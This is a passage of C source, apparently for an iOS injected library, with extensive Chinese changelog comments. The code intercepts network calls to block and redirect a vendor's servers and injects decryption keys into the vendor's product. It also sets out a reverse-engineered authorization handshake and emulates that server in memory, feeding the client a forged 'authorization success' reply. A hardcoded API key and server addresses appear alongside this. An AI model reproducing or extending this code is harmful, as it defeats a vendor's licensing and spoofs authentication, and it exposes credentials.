#define MODE_PROBE       1
#define MH_SNAP_MAX      12     // 密钥字典快照最多记 8 个版本（v6.23q 起留余量给 keyhunt 注入）

// ★ v6.6：主动跟版（免卡密机从我们云端取脚本包本体）
#define SO_VER_PATH        "/ver"        // 云端最新版本查询（只元数据）

// ★★★★ v6.42（2026-10-29）：**卡密判决的两处误判修正**（设备码已定真源后的收尾）
//   ① PENDING 期不否决：v6.41 起 bs_card_login 在 devid 空时直接 return -1
//      （绝不上报空 device_id），可判决段仍只看本地 expire/lastok ⇒ 一次正常冷启
//      （Agent 还没收到服务端下发的设备码，几十秒窗口）会被判 BLOCKED → OPER_STOP
//      + 每 3s 抹模块 → 下次运行必撞 bs_module_lost。改成「没裁决就不判」：
//      保持上一拍状态，持续 PENDING ≥600s 才按正常判定走。
//      → 日志特征 `[card] verdict HELD: device_id pending`
//   ② code=7 拉黑冷却探活：旧版被接管后永久静默，管理员在云端把卡改绑回来
//      设备也一次不再试（现场=「绑回来了还是死不跑」，只能人工换卡/重装 App）。
//      改成每 cardtick×5（≥10min）发一次**不带 act** 的探活心跳：只探不改绑、
//      不与持有方互踢；code=0 就地恢复。
//      → 日志特征 `blacklisted card re-bound on server -> recovered`
//
// ★★★★ v6.41（2026-10-29）：**设备码单一真源 —— 卸载/重装/覆盖都不再变号**
//   现象（2026-10-27 现场 15f9da…）：换机后同一张卡绑在旧机号上，新机被拒（code=7）；
//   中控「自建卡密到期」列空白；重装一次设备号就换一个，卡库绑定全部失配。
//   根因：设备号有**四套取值 + 一个随机兜底**
//     hw.serial（iOS 恒返回字面量 "unknown"）→ token → .bs_devid 随机 32hex → "unknown"
//   任何一环取不到就 md5(序号|时间|pid|栈|clock) 现生成一个 ⇒ 天生漂移。
//   逆向结论（Agent 二进制）：APP 上显示的那串真值是 `_g_script_dev_id`
//     （NSString*，vmaddr 0x100053028，导出符号 `g_script_dev_id`），
//     由 Agent 从服务端配置 TLV(type=0x0a) 收下后写入（全二进制唯一写入点
//     0x1000142cc，位于配置分发器 _bb_RPFBXL3V9G）。服务端按硬件指纹认机，
//     同一台设备每次回同一个号 ⇒ **真值本身不依赖本地任何存储**。
//   修法（三动作，零回退）：
//     ① 读：dlsym("get_script_dev_id") —— 走 Agent 自己的 pthread_mutex；
//        符号不在（APP 进程）就返回"无值"，不猜。
//     ② 钉盘：/var/mobile/Media/.bsdeveid —— prerm 只删 .bsp/bs_modules/bs_pull.conf，
//        卸载 APP 只删沙盒，覆盖 bspath 不涉及 ⇒ 三个场景都留得住。
//     ③ 回填：Agent 尚未收到 TLV 的冷启窗口内，把钉盘值 set 回 _g_script_dev_id，
//        让 APP 显示 / 中控上报 / 卡密绑定从第一秒起就是同一个号。
//   结构性保证：钉盘丢了也不会漂移 —— Agent 连上后重新收到同一个号自动重建。
//   同步：`bs_identity_tick()` 每拍把真值回填 token + 重拼 ?key=（旧版 conf 只拼一次，
//     启动即空 ⇒ 云端只能按 ip: 记账，s2/离线/deny 全失效）。
// ★★★★ v6.40（2026-10-27）：**断网恢复仍不自启的真正元凶：disarm 没认自己人**
//   216 真机复现（13:42:47 中控点运行 → 13:43 断网 → 13:49:40 网络恢复 → 脚本永久空闲）：
//   v6.39 四条链路里**前三条全部生效**，第四条（允许 [ar] 接上）被自己抹掉：
//     13:45:26  [kill] TRIGGERED (heartbeat lost max misses) -> OPER_STOP (resumable=1, KEEP 模块)
//     13:45:35  agent.log: tcp connect server timeout / connect remote server3 failed
//                          / agent stop script        ← 厂商执行我们的停，无 operate 前缀
//     13:46:26  g_kill_resumable = 1
//     13:46:28  [ar] disarmed (center/user stop, no auth-fail nearby) -> lst 被清 0  ← 功亏一篑
//     13:49:40  网络恢复、心跳 200 全绿，但 .bs_ar = armed=0 lst=0 → 永不接
//   根因：`bs_ar_stop_kind` 的**兜底 kind=2**。它只在「无任何错误签名」时才触发，
//   而 `tcp connect server timeout` / `connect remote server3 failed` 根本不在签名表里，
//   于是「我们自己 killswitch 发的停」被判定成「用户在 App 里点的停」。
//   同一份证据有**两条判定入口，一条有保护一条没有**（与 pit-crresume 同型的漏迁）：
//     · :5771 的 run 1->0 判定 → 有 `g_kill_sent && now-g_kill_ts<=180` 保护 ✓
//     · :5998 的 stall scan      → **完全没引用 g_kill_sent / g_kill_resumable** ✗
//     · :6173 / :6198 的 [ar] 抑制矩阵 → 同样只认 kind==2 ✗
//   修法（双层，互为保险）：
//     ① **拆 kind（本质修）**：兜底再分一层 —— 窗口内出现网络故障签名（且无 operate 前缀、
//        无错误签名）→ `kind=6`（自停，归属不明但确定不是人点的），交给 [ar] 按 self-stop 处理。
//        真·中控/人停因 `begin process operate script msg` 在 :5378 提前 return 2，完全不受影响。
//     ② **加自我标记保护（保险）**：5998/6173/6198 三处，只要
//        `g_kill_sent && g_kill_resumable && now-g_kill_ts <= AR_KILL_SELF_WIN` 就直接放行。
//        ★ 必须配时间窗：`g_kill_resumable` 一旦置 1 永不主动清零（只有下一次 kill 才改），
//          单拿它当判据会把用户真点停止也放行。
// ★★★ v6.39（2026-10-24）：断网恢复后脚本不自启 —— 四条链路一起修
//   现象：bspath 设备断网数分钟→恢复网络→脚本停在停态，必须中控点「运行」。
//   根因链（五步）：
//     ① puller tick=60 + hbmiss=3 → **断网 3 分钟**就 `heartbeat lost` 触发 killswitch；
//     ② killswitch 无条件 `bs_wipe_local_modules()` → 模块全删（断网不是模块坏了）；
//     ③ run 1->0 分支无条件 `ar.lst = 0` → [ar] 入口条件 `ar.armed && ar.lst` 直接不成立；
//     ④ [ar] 抑制矩阵 `!g_hb_ok → hb-not-ok` + `AR_KILL_COOL=600s` → 再压 10 分钟；
//     ⑤ 恢复后模块得重新下载，下载失败又撞 `bs_module_lost` → 二次躺平。
//   修法：
//     ① killswitch 按 why 区分：`denied`(授权拒绝) 才抹模块，`lost`(网络失联) 保留；
//     ② 新增 `g_kill_resumable`：网络类 kill 保留 `ar.lst`，允许 [ar] 自动接上；
//     ③ 网络类 kill 冷却 `AR_KILL_COOL_NET=90s`（一个半 tick），封禁仍吃满 600s；
//     ④ 未达阈值期间 puller 用 `HB_FAST_SECS=20s` 快速重试（最多 6 次≈2min），
//        断网恢复能被 20s 内发现，而不是再等 60s；
//     ⑤ 心跳恢复即清 `g_hb_miss`/快速重试计数，回到正常 tick。
// ★ v6.38（2026-10-23）：「加载运行库出错」自愈三件套
//   现象：中控点「运行」→ 厂商 agent 打 `begin load script` → `load snail module failed`
//         → 中控界面显示「加载运行库出错」，且之后每一次运行都复现，永不好转。
//   根因（34 台新机实证，1055=f7d0d6ee / 1056=56b5542c）：
//     ① bs_so_sync_once 读到本地 beta.so 不可用就 `return` —— 完全不拉包；
//     ② bs_refresh_so_vers 在 stat 失败时把版本集合清零 —— verwatch 一把键都不补；
//     ③ 于是盘上没包、字典没键，App 重新 load 必然失败，形成永久死锁。
//   修法：
//     ① 本地读不到 → 里程碑日志 + 直接走「云端 /ver → has_key → 逐版本键闸门 → 下载落盘」；
//     ② stat 失败保留上次版本集合（不清零），键注入不中断；
//     ③ 落盘后立刻重扫 + 补齐全部版本键（把「换包」到「可加载」的窗口压到 0）；
//     ④ [mh] 的 errno 日志 300s 去抖并带 pid —— 旧版每 3s 一条把 8KB 设备日志窗口刷满，
//        远端根本看不到 [so]/[pull]/[off] 真日志（本次排障踩坑）。
// ★ v6.23q：dylib 版本常量 —— 随 /hb 的 &dv= 上报云端（版本历史见文件头注释）
#define BS_DYLIB_VER       "v6.51"
#define SO_SYNC_TICK_SECS  120           // 默认复查间隔
#define SO_SYNC_MIN_TICK   30            // conf sotick= 下限
#define SO_SYNC_MAX_TICK   3600          // 上限
#define SO_SYNC_FIRST_DELAY 20           // 启动后首轮延迟（等 App 网络栈就绪）
#define SO_MIN_BYTES       (600 * 1024)  // 合法 beta.so 体积下限（实际 1.1MB 量级）
#define SO_MAX_BYTES       (8 * 1024 * 1024)   // 上限（与服务端 probe 同口径）

// ★ 运行时配置：PULL_CONF（键=值，一行一个，可缺省）
//     port=18083
//     token=mysecret
//     tick=300
//     enable=1
//     mode=probe                         ← ★ v6.4 真卡机只读雷达
//     moddir=/var/mobile/Media/<自定义>   ← 模块目录可换隐秘路径
//     sosync=1                           ← ★ v6.6 主动跟版开关（0 关）
//     sotick=120                         ← ★ v6.6 跟版复查间隔（30..3600）
//     autoreload=1                       ← ★ v6.7 落盘后自动重启（0 关；仅在脚本运行中才重启）
//     crashresume=1                      ← ★ v6.17 func-nil 崩溃自动拉起（0 关）
//     blockvps=1                         ← ★ v6.19 屏蔽厂商 vps.beibeiplay.com/43.154.19.236（0 关；仅 unlock 生效）
//     cardcheck=1                        ← ★ v6.20 自有卡密系统（0 关；缺省开，仅 unlock 起卡密线程）
//     cardgrace=72                       ← ★ v6.20 网络失败宽限小时数
//     cardtick=120                       ← ★ v6.23u login 心跳间隔秒（原 300）
//     sohost=192.69.0.24                 ← ★ v6.9 局域网中继（仅 beta.so 下载走它；空=直连云端）
//     soport=27391                       ← ★ v6.9 中继端口（sohost 为空时忽略）
//   存在则覆盖上面编译期默认值 → 换端口/开关不必重新编译 dylib。
#define PULL_CONF "/var/mobile/Media/bs_pull.conf"

static void bs_log(const char *fmt, ...);
// ★ v6.24s：s2 下发要用它抠 /hb 应答里的 "s2"（真身在 so_sync 段，此处前置声明）
static int  bs_json_pick_str(const unsigned char *j, size_t n, const char *key,
                             char *out, size_t outsz);

static int    g_port  = PULL_PORT_DEF;
static int    g_tick  = PULL_TICK_SECS;
static char   g_token[128] = PULL_TOKEN_DEF;
static int    g_enable = 1;

// ★ v6.2：服务端地址（默认 BS_HOST_DEF，可被 conf 的 host= 覆盖）
static char   g_host[128] = BS_HOST_DEF;

// ★ v6.9：局域网中继（仅 beta.so 下载走它；/hb /key /ver /probe /modules 仍直连 g_host）
// ★ v6.12：中继地址 = app.plist 的中控 ip（中控 PC 即中继 PC，同一台机器，用户在 App 里填好即可）。
//   conf 的 sohost 仅作应急覆盖（正常部署不需要填）；app.plist 缺失/为空 → 直连云端。
static char   g_sohost[128] = "";
static int    g_soport = 0;
static char   g_appip[64] = "";     // app.plist 抠出的中控 ip（conf 加载时缓存）

// ★ v6：模块目录运行时可换（隐秘路径）。默认 MOD_DIR_DEF，可被 conf 的 moddir 覆盖。
static char   g_mod_dir[256] = MOD_DIR_DEF;

// ★ v6：心跳失联计数（跨线程计数，仅 puller 线程读写 + 其他线程只读）
static volatile int  g_hb_miss  = 0;    // 连续失败次数
static volatile int  g_hb_ok    = 0;    // 最近一次是否成功（1=授权中）
static volatile long g_hb_last  = 0;    // 最近成功的时间戳（秒）
static int           g_hb_max   = HB_MISS_MAX_DEF;  // ★ v6.1 运行时阈值（conf hbmiss=）

// ★ v6.28：本进程是否发过 killswitch 的 OPER_STOP（跨线程，puller 写 / watchdog 读）。
//   用途：killswitch 自己停脚本会造成 run 1->0，v6.24k 的闸门会把它误判成「用户主动停」
//   并落盘 .bs_userstop → 心跳恢复后设备永久躺平。有此标志即可排除。
static volatile int  g_kill_sent = 0;
static volatile long g_kill_ts   = 0;
// ★★★ v6.39：本次 killswitch 是否"可恢复"（1=网络类失联，只停脚本、保留模块、允许 [ar] 接上；
//   0=授权拒绝/封禁，必须清模块且不许自动拉起）。
//   断网事故根因：旧版两者一律清模块 + 清 ar.lst → 断网 3 分钟就永久躺平。
static volatile int  g_kill_resumable = 0;

// 拼好的 query string（"?key=xxx&nm=..&md=..&ov=.." 或 ""）——纯 C 拼接，供 URL 构造直接 snprintf 用
static char   g_qbuf[512] = {0};

// 请求重灌（跨线程安全的「置位」，由主线程/watchdog 执行实际注入）
static volatile int g_need_inject = 0;

// ★ v6.4：运行模式（conf `mode=probe` 切到真卡机只读雷达）
static int g_mode = MODE_UNLOCK;

// ★ v6.4：密钥字典快照（纯 C 副本，probe 线程只读它，避免裸线程反复碰 ObjC 字典）
static unsigned char g_mh_snap[MH_SNAP_MAX][35];   // [3B ver][32B val]
static int           g_mh_n = 0;

// ★ v6.5：已注入的本地版本号（"020909"），供 bs_inject_mh 做「按版本幂等」快路径。
static char          g_mh_ver[8]  = {0};
// ★ v6.5：云端暂无密钥的版本号 + 重试计数（节流用）
static char          g_mh_miss[8] = {0};
static int           g_mh_try     = 0;

// ★ v6.14：最近一次成功注入的「版本号 + 32B 密钥」缓存。
//   产品整表替换字典后，同版本可以**离线**（不碰网络）秒补回去。
static unsigned char g_mh_kk[3]     = {0};
static unsigned char g_mh_vv[32]    = {0};
static volatile int  g_mh_cached    = 0;

// ★ v6.15：载荷记录版本（厂商固定 020909）的密钥缓存 —— 供被冲掉时离线秒补
static unsigned char g_pay_vv[32]    = {0};
static volatile int  g_pay_cached    = 0;
static char          g_pay_miss[8]   = {0};
static int           g_pay_try       = 0;

// ★ v6.18：多版本键（3.0.5 起 lua 记录自带独立版本键）—— per-ver 节流表 + 扫描缓存
#define EK_VERS_MAX       12     // 一份 beta.so 里最多跟踪 12 个不同版本键
static char          g_ek_miss[EK_VERS_MAX][8] = {{0}};   // 上次取键失败的版本（节流）
static int           g_ek_try[EK_VERS_MAX]     = {0};
static unsigned char g_ek_vers[EK_VERS_MAX][3] = {{0}};   // 盘上 beta.so 扫出的段版本集合
static int           g_ek_nver = 0;
static off_t         g_ek_scan_size  = -1;                // 扫描缓存：文件没变不重扫
static long long     g_ek_scan_mtime = -1;

// ★ v6.20：自有卡密系统（v3 并入 BSModuleServer，同协议 /api/client/login）
//   v6.23h：默认 host 18095(CardVault 弃用)→47391(bsmod v3 卡密，2026-10-03)
#define CARD_HOST_DEF  "47.116.161.226:47391"
#define CARD_KEY_DEF   "ak_ba5f7a4ae954dadbb2eaa82ae237967587212d4a6efb0ef4"
#define CARD_PATH      "/api/client/login"
static char          g_card_host[64]  = CARD_HOST_DEF;
static char          g_card_key[80]   = CARD_KEY_DEF;
static int           g_cardcheck      = 1;     // 缺省开（probe 模式整体 early-return 不受影响）
static int           g_cardgrace      = 1;     // 网络失败宽限（小时；v6.23g 72→1，用户拍板）
static int           g_cardtick       = 120;   // 心跳间隔（秒）★ v6.23u 300→120（code=7 被踢感知缩到 2 分钟）
static int           g_noteport       = 34878; // ★ v6.45：BBCenter 中控「备注」上报端口（conf: noteport）
static char          g_note_last[256] = {0};   // ★ v6.45：上次成功写入中控的备注文案（去重用）
static long          g_note_ts        = 0;     // ★ v6.45：上次成功写入中控的时间
// ★★★★★ v6.47：中控「备注」用的冲突记忆 —— **必须与 g_card_kicked 分开**。
//   现场实测（.216，2026-10-30 03:10）：运营在中控输入别人已绑的卡，
//   厂商会把它写进 agent.log；我们的日志尾部扫描每拍都把它当成「真重新输入」
//   → 走 v6.23t 的解除拉黑分支把 g_card_kicked 清空 → 下一拍再撞 code=7 又写回来。
//   结果是 g_card_kicked **每 3 秒抖一次**，拿它当备注判据会一直显示「正常」。
//   所以备注侧另存一份「最近一次冲突」：
static char          g_note_cf_card[80] = {0}; // 最近一次撞冲突的卡号（30 分钟窗口）
static long          g_note_cf_ts       = 0;   // 该次冲突时刻
static long          g_note_cf_evt      = 0;   // 该次冲突对应的「输入事件」时间戳（agent.log 行首）
static int           g_note_cf_sent     = 0;   // 该次冲突是否已上报过（用户要求只报一次）
static int           g_note_force       = 0;   // 状态切换 → 15s 内强制重推一次（覆盖旧备注）
// ★★★★★ v6.50：记住上次推送时包里的「运行状态位」[7] —— 该位一变就必须补推一包，
//   否则中控「运行」列会停在旧值（原厂状态包并不是每次运行状态变化都发）。
static int           g_note_lastrun     = -1;  // -1 = 还没推过
static volatile int  g_card_blocked   = 0;     // 1=封禁（未激活/过期/冻结/绑他机/宽限耗尽）
static volatile long g_card_expire    = 0;     // 到期 unix ts（0=未知）
static volatile long g_card_lastok    = 0;     // 最近一次校验成功时间
static char          g_card_cur[80]   = {0};   // 上次见过的卡密（变更→重新激活）
static char          g_card_kicked[80]= {0};   // ★ v6.23s 被 code=7 踢掉的卡（本地拉黑，防接管振荡）
static long          g_card_kickts    = 0;     // ★ v6.23t 被踢时刻（unix ts）——解除拉黑须「更晚的新输入」
static char          g_card_devid[64] = {0};   // device_id：hw.serial，回退 token
static char          g_cardval[80]    = {0};   // ★ v6.21：conf cardval= 手动卡密（兜底通道）

// ★ v6.19：厂商服务器进程内屏蔽（仅 unlock 模式安装钩子）
static volatile int  g_block_vps     = 1;    // conf `blockvps=`（缺省开）
static volatile int  g_blk_installed = 0;
// ★ v6.24s：闸门提前声明 —— bs_load_conf 里要按 blockvps 同步它（hook 定义在文件末尾）
static volatile int  g_blk_active    = 0;
static volatile long g_blk_n_connect = 0;    // connect 拦截计数
static volatile long g_blk_n_dns     = 0;    // getaddrinfo 拦截计数
#define VPS_DOMAIN   "vps.beibeiplay.com"
#define VPS_IP_STR   "43.154.19.236"
static uint32_t      g_vps_ip_net = 0;       // 网络字节序

// ★ v6.23l：统计上报改道。v6.23m 目标解析顺序：conf statip= 优先；
//   未配置 → 每次现读 app.plist 的中控 ip（端口 7875/7880 不变）。
//   两者都无 → 不改道（原样发厂商）。
//   不依赖 beta.so 版本/lua 变量名；probe 模式同样生效（只碰统计 IP，卡密链路无关）。
#define STAT_VENDOR_IP "60.204.159.47"
static char          g_stat_ip[64]  = {0};   // 改道目标（点分十进制）
static uint32_t      g_stat_ip_net  = 0;     // 目标（网络字节序；0=关闭）
static uint32_t      g_stat_vp_net  = 0;     // 厂商统计 IP（网络字节序）
static volatile long g_stat_n_redir = 0;     // 改道计数

// ★★★ v6.24s：server2 地址云端可配（不写死 agent.dat）
//
//   背景：Agent 连中控的链路是 server1(本机) → server2(厂商 7891) → server3(中控)，
//   server2 通不了就永远走不到 server3。而 server2 地址来自代理进程的 agent.dat
//   缓存（4B IPv4）或 DNS 解析 vps.beibeiplay.com——两个都不受我们控制：
//     · agent.dat 缺失 → 走 DNS → 被 blockvps 拦死（188 台卡在这）
//     · agent.dat 有值但指向的厂商 IP 在部分网络不可达（5 台卡在这）
//     · agent.dat 指向 60.204.159.47 → 每 15~20s 直连厂商（238 台）
//
//   解法：中控 /hb 应答带 "s2":"<ip>[:port]" → 本进程记住 → 在 connect 层改道，
//   不写任何文件（代理进程自己也会写 agent.dat，写文件必然打架），不用重启：
//     · connect(60.204.159.47:7891) / connect(43.154.19.236:7891) → 改到 s2
//     · getaddrinfo(vps.beibeiplay.com) → 直接把域名换成 s2 的数字 IP 交给系统
//       （缺 agent.dat 的设备也能拿到一个能连的地址，不再 dns look up failed）
//
//   取值优先级：/hb 下发（每拍覆盖，可远程随时改） > conf `s2=`（离线兜底）
//   语义："ip" / "ip:port" = 改道；"off"/"" = 不改道；"vendor" = 显式放行厂商
//   应答里没有 s2 字段 = 保持现值（兼容老中控）
#define S2_DEF_PORT 7891
static char          g_s2_ip[64]    = {0};
static uint32_t      g_s2_net       = 0;
static int           g_s2_port      = S2_DEF_PORT;
static volatile long g_s2_n         = 0;     // 改道/伪DNS 计数（共用，日志节流用）
static char          g_s2_src[12]   = "none"; // conf / hb

/// 应用一条 s2 配置。v 可以是 "ip"、"ip:port"、"off"、""、"vendor"。
///   ★ 只在值变化时打 applied 日志，避免每拍心跳刷屏。
static void bs_s2_apply(const char *v, const char *src) {
    char ip[64];
    int  port = S2_DEF_PORT;
    if (!v || !v[0] || !strcmp(v, "off")) {
        if (g_s2_net) bs_log("[s2] cleared (was %s:%d) src=%s", g_s2_ip, g_s2_port, src);
        else if (!strcmp(src, "hb")) bs_log("[s2] cleared (already off) src=hb");
        g_s2_net = 0; g_s2_ip[0] = 0;
        snprintf(g_s2_src, sizeof(g_s2_src), "%s", src);
        return;
    }
    if (!strcmp(v, "vendor")) {           // 显式放行厂商（等同 blockvps=0 的网段行为）
        if (g_s2_net) bs_log("[s2] cleared (vendor passthrough) src=%s", src);
        g_s2_net = 0; g_s2_ip[0] = 0;
        snprintf(g_s2_src, sizeof(g_s2_src), "%s", src);
        return;
    }
    const char *c = strchr(v, ':');
    if (c) {
        size_t l = (size_t)(c - v);
        if (l >= sizeof(ip)) l = sizeof(ip) - 1;
        memcpy(ip, v, l); ip[l] = 0;
        int p = atoi(c + 1);
        if (p > 0 && p < 65536) port = p;
    } else {
        strncpy(ip, v, sizeof(ip) - 1);
        ip[sizeof(ip) - 1] = 0;
    }
    uint32_t net = inet_addr(ip);
    if (net == INADDR_NONE || net == 0) {
        bs_log("[s2] bad value '%s' src=%s (kept %s)", v, src,
               g_s2_net ? g_s2_ip : "(off)");
        return;
    }
    int changed = (net != g_s2_net) || (port != g_s2_port);
    g_s2_net  = net;
    g_s2_port = port;
    strncpy(g_s2_ip, ip, sizeof(g_s2_ip) - 1);
    g_s2_ip[sizeof(g_s2_ip) - 1] = 0;
    snprintf(g_s2_src, sizeof(g_s2_src), "%s", src);
    if (changed) bs_log("[s2] applied %s:%d src=%s", g_s2_ip, g_s2_port, src);
}

// ★ v6.6：主动跟版（conf sosync= / sotick=）
static int           g_so_sync = 1;
static int           g_so_tick = SO_SYNC_TICK_SECS;

// ★★★ v6.37：probe 上行开关（conf probeupl=，**默认 0 = 不上传**）。
//   背景（2026-10-22 / 10-23 事故）：.98 真卡机 probe 在 15:44:22.599 上报 030102，
//   7ms 后云端落盘 beta_030102.so → 全网 280+ 台被 bs_so_sync「只升不降」顶到
//   厂商原版（AUTO_HARDEN=False，不硬化），8105 等设备随即 func-nil 死亡循环。
//   probe 的职责从此收窄为「只拉不传」：
//     · 上传（BSPR 帧 = 密钥 + 1MB 包体）：默认关闭，一个字节都不发。
//     · 跟版（GET /ver → /script/beta.so）：MODE_PROBE 下照跑，落盘后**不重启脚本**
//       （bs_so_maybe_reload 自 v6.24q 起只写 pend=1，不做任何运行态改动）。
//   要临时恢复上传：conf 写 probeupl=1（老行为，慎用）。
static int           g_probe_upl = 0;

// ================================================================
// ★★★★ v6.25：真离线 —— 进程内接管 server2，一个字节都不发厂商
// ================================================================
//
// 协议已完整破译（frida 在 .216 上实抓，非推断）：
//   tx 262 = 06 01 | 00000000 | RSA-2048(SecKeyEncrypt, PKCS1) 加密的 32B 随机 R
//   rx  38 = 26 00 00 00 01 00 | 32B 会话材料 M（明文；厂商对任意垃圾握手都回，不校验内容）
//   KDF    = AES-128-CBC，key = MD5(R)，iv = MD5(M)
//   tx 208 = CBC(key,iv) 加密的 TLV 请求（首 4 字节 d0 00 00 00 = 总长 208）
//   rx  80 = CBC(key,iv) 加密的 TLV 应答（明文：50000000 … 0700 01 00 = 授权成功）
//   tx  16 = 收尾确认；出现它就代表 Agent 认为授权通过 → 才会去连 server3（中控）
//
// 做法：connect 直接返回成功（不建真连接），send/recv 在内存里伪造应答。
//   不监听端口、不开 socket、不产生任何外发流量。
//   ★ 默认关闭（offline=0）；只有 conf offline=1 才启用，现网 238 台不受影响。
//
// ----------------------------------------------------------------
// ★ v6.25d：协议变更哨兵（2026-10-21）
// ----------------------------------------------------------------
// ★ v6.25j：修 **消费式缓冲** —— 状态机 want(262/208/16) 不变，只是处理完一包后
//   把剩余字节 memmove 前移，而不是 accn=0 整块丢弃。
//   旧版 262 与 208 粘包到达（accn=470）时只认前 262，后半个 208 被丢进黑洞 →
//   桩等 208 永不至、客户端等 80 永不至 → 30s 后 recv auth failed 并 close。
//   实测 24 台受害机全部是这一形态（14ms 完成 262->38、30.0s closed(n=0)、无 idle）。
//   ★ 不能用包头长度切包：208 是密文包，首字节随机（.216 实测 86d6/1521/43e0）。
// 风险：桩是**严格线性状态机**（want: 262 → 208 → 16 → 262），acc 只 1024B。
//   厂商哪天改了握手包长或 TLV 结构，桩会卡住 → 授权拿不到 → 设备**中控整机
//   不上线**。这比「脚本挂」严重得多（脚本挂了至少中控还看得见设备），而现场
//   完全看不出原因，只能一台台 SSH 上去翻日志。
// 判据（★ v6.25e 修正，见下）：只数**协议级异常**，不数「连接没走完」。
// 打点：off_start 记分母（g_off_n_stub），off_worker 到 16 记分子（g_off_n_ok）
//   并清零 g_off_fail_run；只有 proto_bad=1 的 break 才计入连击，
//   连击达 g_offstall（conf offstall=，默认 5 ≈ 100s）置 g_off_stall 并写 bs_evt.log。
// 上报：/hb query 追加 &of=ok|stall&ofn=<连击数>，服务端设备表标红。
//   ★ 只在 offline=1 时带 —— 透传设备没有桩，带这个字段会污染设备表。
// 恢复：下一次 accepted 自动清零并写 `[off] ★ recovered`，红标随之消失。
// 零新线程、零新 CSS、与老 dylib/老服务端双向兼容（字段缺失即不显示）。
//
// ----------------------------------------------------------------
// ★ v6.25e：修正 v6.25d 的误报来源 + 修桩线程 fd 泄漏（2026-10-21 实测）
// ----------------------------------------------------------------
// 实测发现 v6.25d 的判据「本轮没走到 accepted」**不是**协议变更的干净信号，
//   因为它把三种完全正常的情况也算成失败：
//     a) 客户端连上、什么都没发就关闭（`stub conn closed (n=0)`）—— 连接被上游取消；
//     b) 客户端只走 262→208 两跳、不走到 16 就关闭 —— 密钥刷新根本不需要第三步；
//     c) 进程/脚本重启瞬间的连续短连接。
//   真机日志回放：历史最长连击 9 次，全部由上面三种构成 → 阈值 5 会误报。
//   故改为：只在**协议级异常**处置 proto_bad，仅 proto_bad 计入连击：
//     · off_plain80() 返回 NULL   —— 固化的 80B 应答模板解析失败（TLV 结构变了）
//     · aes fail                  —— key/iv 与厂商侧的期望对不上
//     · 208B 明文头反推 key 失败  —— 厂商那块「已知明文头」不再成立
//   这四处任一长期反复出现，才是「厂商真的改了协议」。
// 同时修 fd/线程泄漏：客户端发完 262 收到 38 后，某些状态（如卡密闸门已开）会
//   **既不发 208 也不关闭**，worker 永久阻塞在 recv —— 实测 28 个连接卡死在此，
//   每轮泄漏一个 socketpair fd + 一个线程。现在给桩 fd 加 OFF_IDLE_TIMEOUT（90s）
//   接收超时，超时即收尾关闭；超时记为 abort（不计数），只有 proto_bad 才计数。
//
// ----------------------------------------------------------------
// ★ v6.25f：哨兵状态跨进程共享（2026-10-21 真机实测驱动）
// ----------------------------------------------------------------
// v6.25e 上真机发现：**装 connect 钩子/跑桩线程的进程 ≠ 发 /hb 的进程**
//   （厂商客户端在 App 侧进程，心跳在 Agent）。桩里置的 g_off_stall 在 /hb 那侧
//   永远读到 0 —— 日志里 `[off] ★ STALL 2 consecutive protocol errors` 已经打了，
//   心跳却仍报 `of=ok&ofn=0`，设备表永远不标红，等于哨兵白做。
// 修法：状态落一行小文件 DATA_DIR/.bs_off_state（`<epoch> <ok|stall> <ofn>`），
//   两进程共用；/hb 侧取「更坏」的结论，并带 OFF_STATE_TTL=900s 陈旧保护
//   （进程没了就别一直红着）。accepted 是**唯一能证伪**「协议变了」的硬证据，
//   任何进程走到 accepted 都写 ok，跨进程清告警。
#define OFF_IDLE_TIMEOUT   90      // 桩接收空闲超时（秒）。实测跳间 RTT < 50ms，90s 极宽松
#define OFF_RESP80_HEX                                                        \
    "500000000300430000000400000107000100000000060002736a7a"                  \
    "080003332e312e3023000a34326336393731656162646337326335303665333663656538"\
    "3537363630643607000b7518569f67b5df"

// ★ v6.25d：bs_evt 本体定义在文件后段（事件专道），而离线桩线程在此处就要用，
//   补一条前置声明，避免 clang 隐式声明（可变参数函数隐式声明是 UB）。
static void bs_evt(const char *fmt, ...);

static int      g_offline        = 0;   // conf offline= / hb off=
static uint32_t g_off_vendor_net = 0;   // 60.204.159.47（网络序）
static uint8_t  g_off_R[32];            // 设备最近一次 SecKeyEncrypt 的 32B 明文
static volatile int    g_off_R_ok = 0;
static char     g_off_devid[33];        // 本机 32 hex 设备码（填进 80B 应答）

// ★ v6.25d：协议变更哨兵 —— 厂商若改握手包长/TLV 结构，桩会卡住拿不到授权，
//   设备表现为「中控整机不上线」，且现场完全看不出原因。
//   ★ v6.25e：判据改为「连续 N 次协议级异常」（见上方说明），计数器零新线程。
static volatile long g_off_n_stub   = 0;  // 累计 connect 被拦截次数
static volatile long g_off_n_ok     = 0;  // 累计 16 = accepted 次数
static volatile int  g_off_fail_run = 0;  // 连续协议级异常次数（★v6.25e 告警判据）
static volatile int  g_off_stall    = 0;  // 1 = 当前处于告警态
static int           g_offstall     = 5;  // conf offstall= 阈值（2..60）
static long          g_off_last_bad = 0;  // 最近一次异常时间戳
static int           g_off_hb_stall_logged = 0;  // ★v6.25g：心跳首次带出 stall 只记一条

// ★★★★ v6.25i：离线出站白名单（默认拒绝）。旧的「只管已知端口」有三个实证漏洞：
//   ① 只处理 7891 / 7875 / 7880 —— 60.204.159.47 的**其它端口**直接落到
//      `return g_orig_connect`，真外发；
//   ② 7875/7880 若 statip 与 app.plist 都没 IP，代码注释明写「原样放行（落厂商）」；
//   ③ sendto/sendmsg 完全没 hook —— UDP 无连接，connect 层根本拦不到。
//   现改为：offline=1 时只有白名单能出去（回环 / 我们云端 / 中控），
//   7891 不分 IP 一律接桩（server2 在协议里只此一个端口，厂商换 IP 也不怕），
//   其余一律 EHOSTUNREACH。逃生门 conf egress=0 退回旧行为。
static volatile int  g_off_egress    = 1;   // conf egress=（1=白名单，0=放行）
static volatile long g_off_n_deny    = 0;   // 被拒的 TCP 出站数
static volatile long g_off_n_deny_u  = 0;   // 被拒的 UDP 出站数
static uint32_t      g_off_cloud_net = 0;   // 47.116.161.226（网络序）
static uint32_t      g_off_pc_net    = 0;   // 中控 IP（网络序，0=未知）
static long          g_off_pc_ts     = 0;   // 中控 IP 缓存时间戳
static uint32_t      g_off_so_net    = 0;   // conf sohost 解析结果（beta.so 独立源）

/// 严格判断 32 位 hex（设备码格式）
static int off_is_hex32(const char *s) {
    int i;
    if (!s) return 0;
    for (i = 0; i < 32; i++) {
        char c = s[i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
            return 0;
    }
    return s[32] == 0 || s[32] == '\n' || s[32] == '\r' || s[32] == ' ';
}

